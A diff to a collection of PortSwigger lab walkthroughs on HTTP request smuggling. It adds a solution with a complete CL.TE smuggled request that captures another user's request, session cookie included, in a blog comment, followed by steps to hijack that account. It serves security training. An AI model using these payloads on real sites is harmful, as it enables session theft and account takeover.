@@ -12,6 +12,7 @@
 - [Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-clte-vulnerability)
 - [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-tecl-vulnerability)
 - [Exploiting HTTP request smuggling to reveal front-end request rewriting](#exploiting-http-request-smuggling-to-reveal-front-end-request-rewriting)
+- [Exploiting HTTP request smuggling to capture other users' requests](#exploiting-http-request-smuggling-to-capture-other-users-requests)
 
 ## HTTP request smuggling, basic CL.TE vulnerability
 Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
@@ -342,7 +343,7 @@ Connection: close
 x=1
 ```
 6. Using the previous response as a reference, change the smuggled request URL to delete the user carlos:
-
+```
 POST / HTTP/1.1
 Host: your-lab-id.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -359,3 +360,30 @@ Connection: close
 
 x=1
 ```
+
+## Exploiting HTTP request smuggling to capture other users' requests
+Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests
+
+<!-- omit in toc -->
+### Solution
+1. Visit a blog post and post a comment.
+3. Send the ``comment-post`` request to Burp Repeater, shuffle the body parameters so the ``comment`` parameter occurs last, and make sure it still works.
+Increase the ``comment-post`` request's ``Content-Length`` to 400, then smuggle it to the back-end server:
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 256
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=your-session-token
+
+csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
+```
+4. View the blog post to see if there's a comment containing a user's request. Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.
+5. Copy the user's Cookie header from the comment, and use it to access their account.
